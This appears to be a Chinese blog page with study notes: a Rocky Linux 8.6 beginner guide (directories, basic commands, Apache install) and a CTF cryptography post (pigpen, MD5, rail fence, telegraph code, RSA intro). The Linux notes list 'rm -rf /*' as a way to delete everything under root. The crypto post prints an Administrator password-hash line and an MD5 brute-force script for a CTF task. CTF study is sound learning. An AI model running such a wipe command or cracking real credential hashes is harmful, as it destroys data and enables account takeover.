              <time title="Created: 2023-07-26 21:28:34" itemprop="dateCreated datePublished" datetime="2023-07-26T21:28:34+08:00">2023-07-26</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-01-10 18:40:28" itemprop="dateModified" datetime="2025-01-10T18:40:28+08:00">2025-01-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="rocky-8-6"><a href="#rocky-8-6" class="headerlink" title="rocky 8.6"></a>rocky 8.6</h1><h2 id="一-前期准备"><a href="#一-前期准备" class="headerlink" title="一.前期准备"></a>一.前期准备</h2><h3 id="1-环境搭建"><a href="#1-环境搭建" class="headerlink" title="1.环境搭建"></a>1.环境搭建</h3><p>虚拟机安装成功并联网</p>
<h3 id="2-linux基本命令操作和文件管理"><a href="#2-linux基本命令操作和文件管理" class="headerlink" title="2.linux基本命令操作和文件管理"></a>2.linux基本命令操作和文件管理</h3><h4 id="（1）根下的目录作用说明："><a href="#（1）根下的目录作用说明：" class="headerlink" title="（1）根下的目录作用说明："></a>（1）根下的目录作用说明：</h4><h5 id="1-x2F"><a href="#1-x2F" class="headerlink" title="1. &#x2F;"></a>1. &#x2F;</h5><p>​		 &#x2F; 处于 linux 系统树形结构的最顶端，它是 linux 文件系统的入口，所有的目录、 文件、设备都在 &#x2F; 之下 </p>
<h5 id="2-x2F-bin"><a href="#2-x2F-bin" class="headerlink" title="2. &#x2F;bin"></a>2. &#x2F;bin</h5><p>   bin 是 Binary 的缩写。常用的二进制命令目录。比如 ls、cp、mkdir、cut 等；和&#x2F;usr&#x2F;bin 类似，一些用户级工具 </p>
<h5 id="3-x2F-boot"><a href="#3-x2F-boot" class="headerlink" title="3. &#x2F;boot"></a>3. &#x2F;boot</h5><p>​		&#x2F;boot 存放的系统启动相关的文件，例如：kernel.grub(引导装载程序) </p>
<h5 id="4-x2F-dev"><a href="#4-x2F-dev" class="headerlink" title="4. &#x2F;dev"></a>4. &#x2F;dev</h5><p>​		&#x2F;dev dev 是 Device 的缩写。设备文件目录，比如声卡、磁盘……在 Linux 中 一切都被看做文件。终端设备、磁盘等等都被看做文件 设备文件: &#x2F;dev&#x2F;sda,&#x2F;dev&#x2F;sda1,&#x2F;dev&#x2F;tty1,&#x2F;dev&#x2F;tty2,&#x2F;dev&#x2F;pts&#x2F;1,  &#x2F;dev&#x2F;zero, &#x2F;dev&#x2F;null, &#x2F;dev&#x2F;cdrom </p>
<h5 id="5-x2F-etc"><a href="#5-x2F-etc" class="headerlink" title="5. &#x2F;etc"></a>5. &#x2F;etc</h5><p>​		&#x2F;etc 常用系统及二进制安装包配置文件默认路径和服务器启动命令目录，</p>
<p>​		如：&#x2F;etc&#x2F;passwd 用户信息文件 	</p>
<p>​				&#x2F;etc&#x2F;shadow 用户密码文件	</p>
<p>​				&#x2F;etc&#x2F;group 存储用户组信息 	</p>
<p>​				&#x2F;etc&#x2F;fstab 系统开机启动自动挂载分区列表 	</p>
<p>​				&#x2F;etc&#x2F;hosts 设定用户自己的 IP 与主机名对应的信息</p>
<h5 id="6-x2F-home"><a href="#6-x2F-home" class="headerlink" title="6. &#x2F;home"></a>6. &#x2F;home</h5><p>&#x2F;home 普通用户的家目录默认存放目录</p>
<h5 id="7-x2F-lib"><a href="#7-x2F-lib" class="headerlink" title="7. &#x2F;lib"></a>7. &#x2F;lib</h5><p>​		 &#x2F;lib 库文件存放目录,函数库目录</p>
<h5 id="8-x2F-mnt"><a href="#8-x2F-mnt" class="headerlink" title="8. &#x2F;mnt"></a>8. &#x2F;mnt</h5><p> &#x2F;mnt &#x2F;media &#x2F;mnt 和&#x2F;media 一般用来临时挂载存储设备的挂载目录，比如有 cdrom、U 盘 等目录 &#x2F;mnt&#x2F;hgfs: 安装 vmware-tools 后，使用共享文件夹功能，可以共享虚 拟机和真机的目录，实现文件相互复制，一般这个功能没有用。我们直接使用 xshell 来上传文件 </p>
<h5 id="9-x2F-opt"><a href="#9-x2F-opt" class="headerlink" title="9. &#x2F;opt"></a>9. &#x2F;opt</h5><p>&#x2F;opt 表示的是可选择的意思，有些软件包也会被安装在这里。如：gitlab &#x2F;proc 操作系统运行时，进程（正在运行中的程序）信息及内核信息（比如 cpu、硬盘 分区、内存信息等）存放在这里。</p>
<h5 id="10-x2F-proc"><a href="#10-x2F-proc" class="headerlink" title="10. &#x2F;proc"></a>10. &#x2F;proc</h5><p>​	&#x2F;proc 目录是伪装的文件系统 proc 的挂载目 录，proc 并不是真正的文件系统。因此，这个目录是一个虚拟的目录，它是系统 内存的映射，我们可以通过直接访问这个目录来获取系统信息。也就是说，这个 目录的内容不在硬盘上而是在内存里 查看咱们的 CPU 信息 cat &#x2F;proc&#x2F;cpuinfo &#x2F;sys 系统目录，存放硬件信息的相关文件</p>
<h5 id="11-x2F-run"><a href="#11-x2F-run" class="headerlink" title="11. &#x2F;run"></a>11. &#x2F;run</h5><p> &#x2F;run 运行目录，存放的是系统运行时的数据，比如进程的 PID 文件</p>
<h5 id="12-x2F-srv"><a href="#12-x2F-srv" class="headerlink" title="12. &#x2F;srv"></a>12. &#x2F;srv</h5><p> &#x2F;srv 服务目录，存放的是我们本地服务的相关文件</p>
<h5 id="13-x2F-sbin"><a href="#13-x2F-sbin" class="headerlink" title="13. &#x2F;sbin"></a>13. &#x2F;sbin</h5><p>​	 &#x2F;sbin 大多数涉及系统管理的命令都存放在该目录中，它是超级权限用户 root 的可 执行命令存放地，普通用户无权限执行这个目录下的命令，凡是目录 sbin 中包含 的命令都是 root 权限才能执行的 </p>
<h5 id="14-x2F-tmp"><a href="#14-x2F-tmp" class="headerlink" title="14. &#x2F;tmp"></a>14. &#x2F;tmp</h5><p>​		 &#x2F;tmp 该目录用于存放临时文件，有时用户运行程序的时候，会产生一些临时文 件。&#x2F;tmp 就是用来存放临时文件的。&#x2F;var&#x2F;tmp 目录和该目录的作用是相似的, 不能存放重要数据，系统会定期删除这个目录下的没有被使用的文件。 它的权限比较特殊 [root@xuegod63 ~]# ls -ld &#x2F;tmp drwxrwxrwt 10 root root 12288 Oct 3 20:45 &#x2F;tmp&#x2F; →粘滞位（sticky bit）目录的 sticky 位表示这个目录里的文件只能被文件的 owner（所有者）和 root 删除 &#x2F;var 系统运行和软件运行时产生的日志信息，该目录的内容是经常变动的，存放的是 一些变化的文件。比如&#x2F;var 下有&#x2F;var&#x2F;log 目录用来存放系统日志的目录，还有 mail、&#x2F;var&#x2F;spool&#x2F;cron </p>
<h5 id="15-x2F-usr"><a href="#15-x2F-usr" class="headerlink" title="15. &#x2F;usr"></a>15. &#x2F;usr</h5><p>&#x2F;usr 存放应用程序和文件， &#x2F;usr&#x2F;bin 普通用户使用的应用程序 &#x2F;usr&#x2F;sbin 管理员使用的应用程序 &#x2F;usr&#x2F;lib 库文件 Glibc(32 位) &#x2F;usr&#x2F;lib64 库文件 Glibc &#x2F;lib &#x2F;lib64 是 &#x2F;usr&#x2F;lib 和 这个目录里存放着系统最基本的动态链接共享库，包含许多被&#x2F;bin&#x2F;和&#x2F;sbin&#x2F;中的 程序使用的库文件，目录&#x2F;usr&#x2F;lib&#x2F;中含有更多用于用户程序的库文件。作用类似 于 windows 里的 DLL 文件，几乎所有的应用程序都需要用到这些共享库 注：lib***.a 是静态库 ， lib***.so 是动态库</p>
<h4 id="（2）基本文件操作"><a href="#（2）基本文件操作" class="headerlink" title="（2）基本文件操作"></a>（2）基本文件操作</h4><p>​     内部命令：在系统启动时就调入内存，是常驻内存的，所以执行效率高 </p>
<p>​	外部命令：是系统软件的功能，用户需要时才从硬盘中读入内存	</p>
<p>​	如何区分内外部命令？ </p>
<p>​	使用 type 命令 ，语法 : type 要检测的命令</p>
<p>​	例：	type cat </p>
<p>​				cat 是 &#x2F;usr&#x2F;bin&#x2F;cat</p>
<p>绝对路径：一切从根目录开始的路径</p>
<p>相对路径：非从根目录开始的路径</p>
<p>Linux的两种时钟<br>系统时钟：由Linux内核通过CPU的工作频率进行的<br>硬件时钟：主板</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"> 当前目录.   上一个目录..</span><br><span class="line"> </span><br><span class="line"> 1.删除</span><br><span class="line">  rm</span><br><span class="line">  </span><br><span class="line">  -rf  表示递归强制删除所有</span><br><span class="line">  </span><br><span class="line">  /*  根目录下所有目录</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"> 2.查看目录下内容</span><br><span class="line">  ls</span><br><span class="line">  </span><br><span class="line">  ls -l   列出文件详细信息</span><br><span class="line">  </span><br><span class="line"> 3.查看当前所在目录</span><br><span class="line">  pwd</span><br><span class="line">    </span><br><span class="line"> 4.创建文件夹</span><br><span class="line"> mkdir -p 文件夹</span><br><span class="line"> </span><br><span class="line"> 5.进入文件</span><br><span class="line"> cd</span><br><span class="line"> </span><br><span class="line"> 6.快速打开一个终端</span><br><span class="line"> ctrl+shift+T</span><br><span class="line"> </span><br><span class="line"> 7.终端字体放大</span><br><span class="line">  shift+ctrl+加号</span><br><span class="line">  </span><br><span class="line"> 8.终端字体缩小：</span><br><span class="line">   ctrl+ 减号</span><br><span class="line">   </span><br><span class="line"> 9.命令可以查看cpu信息</span><br><span class="line"> lscpu</span><br><span class="line"> cat /proc/cpuinfo也可看查看到</span><br><span class="line"> </span><br><span class="line"> 10.查看内存大小</span><br><span class="line"> free</span><br><span class="line"> cat /proc/meminfo </span><br><span class="line"> </span><br><span class="line"> 11.查看硬盘和分区情况</span><br><span class="line"> lsblk</span><br><span class="line"> cat /proc/partitions</span><br><span class="line"> </span><br><span class="line"> 12.查看内核版本</span><br><span class="line"> uname -r</span><br><span class="line"> </span><br><span class="line"> 13.查看操作系统发行版本</span><br><span class="line">centos: cat /etc/os-release </span><br><span class="line"></span><br><span class="line"> 14.用户登录信息查看命令</span><br><span class="line">whoami: 显示当前登录有效用户</span><br><span class="line">who: 系统当前所有的登录会话</span><br><span class="line">w: 系统当前所有的登录会话及所做的操作</span><br><span class="line"></span><br><span class="line">15.关机和重启</span><br><span class="line"></span><br><span class="line">关机：</span><br><span class="line">halt</span><br><span class="line">poweroff</span><br><span class="line"></span><br><span class="line">重启：</span><br><span class="line"> reboot</span><br><span class="line"> -f: 强制，不调用shutdown</span><br><span class="line"> -p: 切断电源</span><br><span class="line"></span><br><span class="line">关机或重启：shutdown</span><br><span class="line"></span><br><span class="line">shutdown [OPTION]...  [TIME] [MESSAGE]</span><br><span class="line"> -r: reboot</span><br><span class="line"> -h: halt</span><br><span class="line"> -c：cancel</span><br><span class="line"> TIME：无指定，默认相当于+1（CentOS7）</span><br><span class="line"> now: 立刻,相当于+0</span><br><span class="line"> +#: 相对时间表示法，几分钟之后；例如 +3</span><br><span class="line"> hh:mm: 绝对时间表示，指明具体时间</span><br><span class="line"> </span><br><span class="line"> 16. date 显示和设置系统时间</span><br><span class="line"> 时区：</span><br><span class="line"> /etc/localtime</span><br><span class="line"> timedatectl set-timezone Asia/Shanghai</span><br><span class="line"> /etc/timezone </span><br><span class="line"> </span><br><span class="line"> 17.whatis 使用数据库来显示命令的简短描述</span><br><span class="line">  刚安装后不可立即使用，需要制作数据库</span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">CentOS 7 版本以后</span></span><br><span class="line">  mandb </span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">CentOS 6 版本之前</span></span><br><span class="line">  makewhatis</span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<h5 id="查看文件权限"><a href="#查看文件权限" class="headerlink" title="查看文件权限"></a>查看文件权限</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">1.用户名创建（root创建）</span><br><span class="line">useradd 用户名</span><br><span class="line"></span><br><span class="line">2.添加用户密码</span><br><span class="line">passwd 用户名</span><br><span class="line"></span><br><span class="line">3.切换登录用户</span><br><span class="line">su 用户名</span><br><span class="line">（#表示是 root 用户登录，管理员账号登陆  #表示普通用户登录    #su 用户名（切换登录用户）</span><br><span class="line"></span><br><span class="line">4.ls</span><br><span class="line"> -a 包含隐藏文件</span><br><span class="line"> -l 显示额外的信息</span><br><span class="line"> -R 目录递归</span><br><span class="line"> -ld 目录和符号链接信息</span><br><span class="line"> -1 文件分行显示</span><br><span class="line"> -S 按从大到小排序</span><br><span class="line"> -t 按mtime排序</span><br><span class="line"> -u 配合-t选项，显示并按atime从新到旧排序</span><br><span class="line"> -U 按目录存放顺序显示</span><br><span class="line"> -X 按文件后缀排序</span><br><span class="line"> </span><br><span class="line">5.查看文件状态 stat</span><br><span class="line">文件相关信息：metadata, data</span><br><span class="line"></span><br><span class="line">每个文件有三个时间戳：</span><br><span class="line"></span><br><span class="line">access time 访问时间，atime，读取文件内容</span><br><span class="line">modify time 修改时间，mtime，改变文件内容（数据）</span><br><span class="line">change time 改变时间，ctime，元数据发生改变</span><br><span class="line"></span><br><span class="line">6.文件可以包含多种类型的数据，使用file命令检查文件的类型，然后确定适当的打开命令或应用程序使用</span><br><span class="line"></span><br><span class="line">file [options] &lt;filename&gt;...</span><br><span class="line">常用选项:</span><br><span class="line">	-b 列出文件辨识结果时，不显示文件名称</span><br><span class="line">	-f filelist 列出文件filelist中文件名的文件类型</span><br><span class="line">	-F 使用指定分隔符号替换输出文件名后默认的”:”分隔符</span><br><span class="line">	-L 查看对应软链接对应文件的文件类型</span><br><span class="line">	–help 显示命令在线帮助</span><br></pre></td></tr></table></figure>

<h4 id="（3）-软件安装及镜像源配置"><a href="#（3）-软件安装及镜像源配置" class="headerlink" title="（3）.软件安装及镜像源配置"></a>（3）.软件安装及镜像源配置</h4><p>linux软件：xxx.rpm</p>
<p>软件管理工具 ：yum软件管理仓库</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.安装wget</span><br><span class="line">yum install 软件名 -y</span><br><span class="line">wget安装   yum install wget -y</span><br><span class="line"></span><br><span class="line">2.配置yum源</span><br><span class="line">阿里云源</span><br><span class="line">https://developer.aliyun.com/mirror/?spm=a2c6h.12883283.J_eBhO-wcawiLJRkGqHmozR.72.5f1f4307RqvxrE</span><br></pre></td></tr></table></figure>

<h3 id="apache安装"><a href="#apache安装" class="headerlink" title="apache安装"></a>apache安装</h3><h5 id="1、检查是否安装了Apache服务器软件"><a href="#1、检查是否安装了Apache服务器软件" class="headerlink" title="1、检查是否安装了Apache服务器软件"></a>1、检查是否安装了Apache服务器软件</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep -i httpd</span><br></pre></td></tr></table></figure>

<h5 id="2、卸载已安装的Apache服务器软件"><a href="#2、卸载已安装的Apache服务器软件" class="headerlink" title="2、卸载已安装的Apache服务器软件"></a>2、卸载已安装的Apache服务器软件</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnf remove httpd*</span><br></pre></td></tr></table></figure>

<p>注：如果提示bash: dnf:未找到命令则需要安装dnf命令，分别执行下列两个命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum install epel-release</span><br><span class="line">yum install dnf</span><br></pre></td></tr></table></figure>

<h5 id="3、再次检查是否安装了Apache服务器软件"><a href="#3、再次检查是否安装了Apache服务器软件" class="headerlink" title="3、再次检查是否安装了Apache服务器软件"></a>3、再次检查是否安装了Apache服务器软件</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep -i httpd</span><br></pre></td></tr></table></figure>

<h5 id="4、安装Apache服务器软件"><a href="#4、安装Apache服务器软件" class="headerlink" title="4、安装Apache服务器软件"></a>4、安装Apache服务器软件</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnf  -y install httpd*</span><br></pre></td></tr></table></figure>

<h5 id="5、可以使用rpm-qa-grep-i-httpd命令来查询是否安装成功"><a href="#5、可以使用rpm-qa-grep-i-httpd命令来查询是否安装成功" class="headerlink" title="5、可以使用rpm -qa | grep -i httpd命令来查询是否安装成功"></a>5、可以使用rpm -qa | grep -i httpd命令来查询是否安装成功</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm -qa | grep -i httpd</span><br></pre></td></tr></table></figure>

<h5 id="6、启动httpd服务程序并将其加入到开机启动项中，使其能够随系统开机而运行"><a href="#6、启动httpd服务程序并将其加入到开机启动项中，使其能够随系统开机而运行" class="headerlink" title="6、启动httpd服务程序并将其加入到开机启动项中，使其能够随系统开机而运行"></a>6、启动httpd服务程序并将其加入到开机启动项中，使其能够随系统开机而运行</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start httpd</span><br><span class="line">systemctl enable httpd</span><br></pre></td></tr></table></figure>

<h5 id="7、在浏览器中输入服务器的IP地址，测试服务是否开启"><a href="#7、在浏览器中输入服务器的IP地址，测试服务是否开启" class="headerlink" title="7、在浏览器中输入服务器的IP地址，测试服务是否开启"></a>7、在浏览器中输入服务器的IP地址，测试服务是否开启</h5><h4 id="配置Apache服务"><a href="#配置Apache服务" class="headerlink" title="配置Apache服务"></a>配置Apache服务</h4><h5 id="1、Apache服务常见配置文件介绍"><a href="#1、Apache服务常见配置文件介绍" class="headerlink" title="1、Apache服务常见配置文件介绍"></a>1、Apache服务常见配置文件介绍</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">文件名称	                                                          作用</span><br><span class="line">/etc/httpd	                                                      服务目录</span><br><span class="line">/etc/httpd/conf/httpd.conf	                                      主配置文件</span><br><span class="line">/var/www/html	                                                  网站数据目录</span><br><span class="line">/var/log/httpd/access_log                                         访问日志</span><br><span class="line">/var/log/httpd/error_log                                          错误日志</span><br><span class="line">/etc/httpd/conf.d                                                 附加模块配置文件</span><br><span class="line">/etc/httpd/modules                                                模块文件路径链接</span><br><span class="line">/etc/httpd/bin/                                                   二进制命令</span><br><span class="line">/etc/httpd/logs                                                   默认日志文件位置</span><br></pre></td></tr></table></figure>

<h5 id="2、Apache主配置文件介绍"><a href="#2、Apache主配置文件介绍" class="headerlink" title="2、Apache主配置文件介绍"></a>2、Apache主配置文件介绍</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    在httpd服务程序的主配置文件中，存在三种类型的信息：注释行信息、全局配置、区域配置。（位置：/etc/httpd/conf/httpd.conf）</span><br><span class="line"></span><br><span class="line">vim /etc/httpd/conf/httpd.conf</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/11/%E5%AF%86%E7%A0%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="tyc的小窝">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/11/%E5%AF%86%E7%A0%81/" class="post-title-link" itemprop="url">密码学</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-06-11 22:21:08" itemprop="dateCreated datePublished" datetime="2023-06-11T22:21:08+08:00">2023-06-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2025-01-10 18:35:43" itemprop="dateModified" datetime="2025-01-10T18:35:43+08:00">2025-01-10</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h1><h4 id="1-猪圈密码（buu萌哒哒的八戒）"><a href="#1-猪圈密码（buu萌哒哒的八戒）" class="headerlink" title="1.猪圈密码（buu萌哒哒的八戒）"></a>1.猪圈密码（buu萌哒哒的八戒）</h4><p><img src="/2023/06/11/%E5%AF%86%E7%A0%81/Desktop\Crypto\bajie.jpg" alt="bajie"></p>
<h4 id="2-MD5"><a href="#2-MD5" class="headerlink" title="2.MD5"></a>2.MD5</h4><p>（1）buu获得权限的第一步Administrator:500:806EDC27AA52E314AAD3B435B51404EE:F4AD50F57683D4260DFD48AA351A17A8:::</p>
<p>将F4AD50F57683D4260DFD48AA351A17A8MD5解密即可</p>
<p>（2）丢失的MD5</p>
<p>  题目中给的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib   </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">            m=hashlib.md5()</span><br><span class="line">            m.update(<span class="string">&#x27;TASC&#x27;</span>+<span class="built_in">chr</span>(i)+<span class="string">&#x27;O3RJMV&#x27;</span>+<span class="built_in">chr</span>(j)+<span class="string">&#x27;WDJKX&#x27;</span>+<span class="built_in">chr</span>(k)+<span class="string">&#x27;ZM&#x27;</span>)</span><br><span class="line">            des=m.hexdigest()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;e9032&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;da&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;911513&#x27;</span> <span class="keyword">in</span> des:</span><br><span class="line">                <span class="built_in">print</span> des</span><br></pre></td></tr></table></figure>

<p> 修改后的代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>)：</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>)：</span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>)：</span><br><span class="line">			m = hashlib.md5()</span><br><span class="line">			s = <span class="string">&#x27;TASC&#x27;</span> + <span class="built_in">chr</span>(i) + <span class="string">&#x27;O3RJMV&#x27;</span> +<span class="built_in">chr</span>(j) +<span class="string">&#x27;WDJKX&#x27;</span> +<span class="built_in">chr</span>(k) + <span class="string">&#x27;ZM&#x27;</span></span><br><span class="line">			m.update(s.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">			des = m.hexdigest()</span><br><span class="line">			<span class="keyword">if</span> <span class="string">&#x27;e9032&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;da&#x27;</span> <span class="keyword">in</span> des <span class="keyword">and</span> <span class="string">&#x27;911513&#x27;</span> <span class="keyword">in</span> des:</span><br><span class="line">				<span class="built_in">print</span>(des)</span><br><span class="line">				<span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h4 id="2-栅栏密码"><a href="#2-栅栏密码" class="headerlink" title="2.栅栏密码"></a>2.栅栏密码</h4><p>特征U2开头需要密钥，一种流加密<br>把要加密的明文分成N个一组，然后把每组的第一个字连起来，形成一段无规律的话。<br>不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。<br>参考<br>加密原理<br>举例：<br>n &#x3D; 7, m &#x3D; 2<br>假设明文为：have a good night<br>加密过程如下：<br>将其去掉空格：haveagoodnight<br>分成7组：ha ve ag oo dn ig ht<br>ha<br>ve<br>ag<br>oo<br>dn<br>ig<br>ht<br>按照竖排来组合，则它的栅栏密码为：hvaodihaegongt<br>解密过程如下：<br>先将其分为2组：hvaodih aegongt<br>hvaodih<br>aegongt<br>然后按照每组按次序取一个进行重新组合：ha ve ag oo dn ig ht<br>拼起来即可：haveagoodnight<br>添加上必需的空格即可：have a good night</p>
<h4 id="3-中文电码"><a href="#3-中文电码" class="headerlink" title="3.中文电码"></a>3.中文电码</h4><p>606046152623600817831216121621196386</p>
<pre><code>中文电码采用了四位阿拉伯数字作代号，
从0001到9999按四位数顺序排列，用四位数字表示最多一万个汉字、字母和符号。
汉字先按部首，后按笔划排列。
字母和符号放到电码表的最尾。
后来由于一万个汉字不足以应付户籍管理的要求，又有第二字面汉字的出现。
在香港，两个字面都采用同一编码，由输入员人手选择字面；
在台湾，第二字面的汉字会在开首补上“1”字，变成5个数字的编码。
</code></pre>
<h1 id="现代密码"><a href="#现代密码" class="headerlink" title="现代密码"></a>现代密码</h1><h2 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h2><h3 id="rsa算法简介"><a href="#rsa算法简介" class="headerlink" title="rsa算法简介"></a>rsa算法简介</h3><p>RSA是公钥密码体制，是一种使用不同加密密钥与解密密钥的解密方式</p>
